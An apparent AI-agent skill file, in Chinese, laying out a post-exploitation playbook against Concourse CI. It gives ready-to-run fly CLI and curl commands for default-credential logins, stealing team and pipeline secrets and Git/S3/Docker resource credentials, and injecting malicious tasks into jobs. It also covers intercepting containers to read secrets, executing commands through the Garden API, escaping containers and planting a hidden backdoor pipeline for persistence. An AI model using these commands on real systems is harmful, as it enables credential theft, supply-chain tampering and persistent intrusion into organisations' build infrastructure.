---
name: concourse-tactics
description: "Concourse CI 渗透测试与利用。当发现目标运行 Concourse CI 实例、获取 Fly CLI 凭据或 API Token、需要从 Concourse Pipeline 窃取凭据或注入恶意任务时使用。覆盖未授权访问、Pipeline 变量与私有密钥窃取、Job 篡改、Resource 凭据提取（Git/S3/Docker）、Task 脚本注入、Build 日志窃取、Worker 利用、容器逃逸、Pipeline 后门持久化"
metadata:
  tags: "concourse,ci-cd,fly-cli,pipeline,worker,task,resource,build,容器逃逸,凭据窃取"
  category: "postexploit"
---

# Concourse CI 渗透测试与利用方法论

Concourse CI 是以容器为核心的 CI/CD 系统——每个 Task 运行在独立容器中、Pipeline 配置即代码、所有凭据通过 Credential Manager 注入。一旦获取到 Fly CLI 凭据或 API Token，攻击者可以窃取 Pipeline 变量中的全部 Secrets、篡改 Job 注入恶意 Task、从 Resource 配置中提取 Git/S3/Docker Registry 凭据、劫持 Build 日志和构建产物，并通过 Worker 节点的 Garden 容器接口实现容器逃逸。

## 深入参考

识别到具体攻击路径后，加载参考文档获取完整命令与利用 Payload：

- Fly CLI 命令、API 调用、注入模板、Worker 利用 → 读 [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: 实例发现与未授权访问

### 1.1 实例识别

Concourse 的默认端口和指纹：

| 组件 | 默认端口 | 识别特征 |
|---|---|---|
| Web UI / ATC API | 8080 / 443 | `/api/v1/info` 返回版本、`/sky/login` 登录页 |
| TSA（Worker 注册） | 2222 | SSH 协议，Banner 含 Concourse |
| Garden（容器管理） | 7777 | 仅 Worker 本地监听 |
| Baggageclaim（卷管理） | 7788 | 仅 Worker 本地监听 |

```bash
# 指纹探测
curl -s https://TARGET:8080/api/v1/info | jq .
# 返回示例: {"version":"7.x.x","worker_version":"2.x","external_url":"..."}
```

### 1.2 未授权 API 枚举

Concourse 默认允许匿名查看 `main` Team 的公开 Pipeline：

```bash
# 公开 Pipeline 列表
curl -s https://TARGET/api/v1/pipelines | jq '.[].name'

# 公开 Team 列表
curl -s https://TARGET/api/v1/teams | jq '.[].name'

# 公开 Build 列表（可能泄露 Job 名称、Pipeline 结构）
curl -s https://TARGET/api/v1/builds | jq '.[] | {id, pipeline_name, job_name, status}'
```

### 1.3 凭据获取

```bash
# 默认凭据测试
fly -t target login -c https://TARGET -u admin -p admin
fly -t target login -c https://TARGET -u test -p test

# 使用已获取的 Bearer Token
curl -H "Authorization: Bearer $TOKEN" https://TARGET/api/v1/teams
```

## Phase 2: Pipeline 变量与 Secrets 窃取

Pipeline 变量是最高价值的攻击目标——它们通常包含 AWS AK/SK、数据库密码、SSH 密钥、Docker Registry 凭据。

### 2.1 枚举 Pipeline 配置

```bash
# 列出所有 Pipeline
fly -t target pipelines -a

# 获取指定 Pipeline 的完整 YAML 配置
fly -t target get-pipeline -p PIPELINE_NAME

# 通过 API 获取（含变量引用）
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM/pipelines/PIPELINE_NAME/config
```

### 2.2 Team 级别变量窃取

```bash
# 获取 Team 的变量列表
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM_NAME/vars

# Pipeline 级别变量
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/teams/TEAM_NAME/pipelines/PIPELINE_NAME/vars
```

常见高价值变量名：`aws_access_key_id`、`aws_secret_access_key`、`private_key`、`ssh_key`、`api_token`、`password`、`docker_username`、`docker_password`。

### 2.3 Credential Manager 后端

Concourse 支持外部 Credential Manager（Vault/CredHub/AWS SSM/K8s Secrets）。如果能访问后端服务，可直接读取所有注入的 Secrets：

| 后端 | 路径模板 | 利用方式 |
|---|---|---|
| Vault | `/concourse/TEAM/PIPELINE/VAR` | Vault Token 泄露 → 直接读取 |
| CredHub | `/concourse/TEAM/PIPELINE/VAR` | CredHub CLI / API |
| AWS SSM | `/concourse/TEAM/PIPELINE/VAR` | AWS 凭据 → ssm:GetParameter |
| K8s Secrets | `TEAM` namespace 下的 Secret | kubectl get secret |

## Phase 3: Resource 凭据提取与 Job 篡改

### 3.1 Resource 凭据提取

Pipeline 的 Resource 定义中直接包含或引用了外部系统的凭据：

```bash
# 提取所有 Resource 的 source 配置
fly -t target get-pipeline -p PIPELINE_NAME | \
  python3 -c "import sys,yaml; d=yaml.safe_load(sys.stdin); [print(r['name'],r['type'],r.get('source',{})) for r in d.get('resources',[])]"
```

高价值 Resource 类型：

| Resource 类型 | 可提取的凭据 |
|---|---|
| `git` | `private_key`、`username`/`password`、`access_token` |
| `s3` | `access_key_id`、`secret_access_key`、`session_token` |
| `docker-image` / `registry-image` | `username`/`password`、Registry Token |
| `github-release` | `access_token` |
| `pool` | Git 仓库凭据 |
| `cf` (Cloud Foundry) | `username`/`password`、`client_id`/`client_secret` |

### 3.2 Job 篡改

如果拥有 `set-pipeline` 权限，可以修改 Job 的 Plan 注入恶意步骤：

```bash
# 导出当前配置
fly -t target get-pipeline -p PIPELINE_NAME > pipeline.yml

# 修改 pipeline.yml，在目标 Job 的 plan 中注入恶意 task
# 然后重新设置
fly -t target set-pipeline -p PIPELINE_NAME -c pipeline.yml

# 触发执行
fly -t target trigger-job -j PIPELINE_NAME/JOB_NAME
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取注入模板

## Phase 4: Build 日志窃取与 Task 脚本注入

### 4.1 Build 日志窃取

Build 日志可能泄露 Secrets（开发者 `echo`/`env` 输出）、内网地址、部署目标：

```bash
# 列出最近的 Build
fly -t target builds -p PIPELINE_NAME

# 实时查看 Build 日志
fly -t target watch -j PIPELINE_NAME/JOB_NAME -b BUILD_NUMBER

# API 批量获取 Build 事件流
curl -H "Authorization: Bearer $TOKEN" \
  https://TARGET/api/v1/builds/BUILD_ID/events
```

### 4.2 Task 脚本注入

如果能修改 Pipeline 引用的 Git 仓库中的 Task 文件：

1. 在仓库的 `.concourse/tasks/` 或 `ci/` 目录下修改 Task YAML
2. Task 的 `run.path` / `run.args` 中注入命令
3. 等待 Pipeline 自动触发或手动触发

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取注入 Task YAML 模板

### 4.3 intercept 进入运行中容器

```bash
# 列出可 intercept 的容器
fly -t target containers

# 进入指定 Build 的 Task 容器（需要 Build 处于运行中或已完成状态）
fly -t target intercept -j PIPELINE_NAME/JOB_NAME -s STEP_NAME

# 在容器内可以：
# - 读取注入的环境变量（Secrets）
# - 访问挂载的 Resource 文件
# - 探测内网
```

## Phase 5: Worker 利用与容器逃逸

### 5.1 Worker 信息收集

```bash
# 列出所有 Worker
fly -t target workers

# Worker 详细信息（平台、标签、活跃容器数）
fly -t target workers --details
```

### 5.2 Garden 容器管理接口

Worker 上的 Garden（端口 7777）是容器管理 API。如果能访问 Worker 网络：

```bash
# 列出容器
curl http://WORKER_IP:7777/containers

# 在容器中执行命令
curl -X POST http://WORKER_IP:7777/containers/HANDLE/processes \
  -d '{"path":"sh","args":["-c","id && cat /proc/1/environ"]}'
```

### 5.3 容器逃逸路径

Concourse Task 默认运行在非特权容器中，但以下条件可导致逃逸：

| 逃逸条件 | 检查方法 | 利用方式 |
|---|---|---|
| `privileged: true` Task | Pipeline YAML 中 `privileged: true` | 完整 Linux capabilities → 挂载宿主机 |
| Docker Socket 挂载 | `ls -la /var/run/docker.sock` | Docker API → 特权容器 |
| Garden API 可达 | `curl http://127.0.0.1:7777/containers` | 创建特权容器 |
| 宿主机 PID namespace | `/proc/1/cgroup` 检查 | `nsenter` 进入宿主机 |

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取逃逸命令

### 5.4 Pipeline 后门持久化

通过创建隐蔽 Pipeline 实现持久化：

```bash
# 创建后门 Pipeline（使用 time trigger 定时执行）
fly -t target set-pipeline -p HIDDEN_NAME -c backdoor_pipeline.yml

# 暴露 Pipeline（可选，取决于隐蔽性需求）
fly -t target expose-pipeline -p HIDDEN_NAME

# 触发
fly -t target trigger-job -j HIDDEN_NAME/JOB_NAME
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取后门 Pipeline YAML

## 决策树

```
发现 Concourse CI 实例
├── 未认证
│   ├── /api/v1/info → 确认版本
│   ├── /api/v1/pipelines → 公开 Pipeline 信息泄露
│   ├── /api/v1/builds → Build 历史泄露
│   ├── 默认凭据 admin/admin → 尝试登录
│   └── 无法登录 → 搜索泄露的 .flyrc / Token
│
├── 已认证（Fly CLI / API Token）
│   ├── fly pipelines -a → 枚举所有 Pipeline
│   │   ├── get-pipeline → 提取 Resource 凭据（Git/S3/Docker）
│   │   └── API /teams/TEAM/vars → 窃取 Team 变量
│   │
│   ├── 有 set-pipeline 权限？
│   │   ├── 是 → Job 篡改注入恶意 Task → Phase 3
│   │   └── 是 → 创建后门 Pipeline → Phase 5
│   │
│   ├── Build 日志 → fly watch → 搜索泄露的 Secrets/内网信息
│   ├── fly intercept → 进入容器 → 读取环境变量/探测内网
│   └── fly workers → Worker 信息 → Garden API 探测
│
└── Worker 网络可达
    ├── Garden 7777 → 容器操作 → 逃逸
    ├── Baggageclaim 7788 → 卷操作
    └── privileged Task → 容器逃逸 → 宿主机控制
```

## 工具速查

| 工具 | 用途 | 关键命令 |
|---|---|---|
| `fly` CLI | Concourse 官方命令行 | `fly -t T login/pipelines/get-pipeline/intercept/workers` |
| `curl` + API | REST API 直接调用 | `/api/v1/pipelines`、`/api/v1/teams/T/vars` |
| `.flyrc` | Fly CLI 凭据文件 | `~/.flyrc` 含 Token，可直接复用 |
| `jq` / `python3 -c yaml` | Pipeline YAML 解析 | 提取 Resource source 中的凭据 |
| Garden API | Worker 容器管理 | `http://WORKER:7777/containers` |

## 注意事项

- **审计日志**：Concourse ATC 记录所有 API 调用和 Fly CLI 操作，`set-pipeline`、`trigger-job`、`intercept` 均会留痕
- **Token 有效期**：Fly CLI Token 默认 24 小时过期，需注意刷新；API Token 取决于 auth provider 配置
- **Team 隔离**：Concourse 以 Team 为隔离边界，不同 Team 的 Pipeline/变量/Worker 互不可见；但 `main` Team 通常拥有全局管理权限
- **Credential Manager**：如果 Concourse 配置了 Vault/CredHub，Pipeline 变量 API 可能返回 `redacted`——需要直接攻击后端存储
- **容器短暂性**：Task 容器在 Build 完成后销毁，持久化需依赖 Pipeline 定时触发或后门 Resource
- **Worker 隔离**：Worker 之间无直接通信，但共享同一 Garden 实例的容器可能存在侧信道
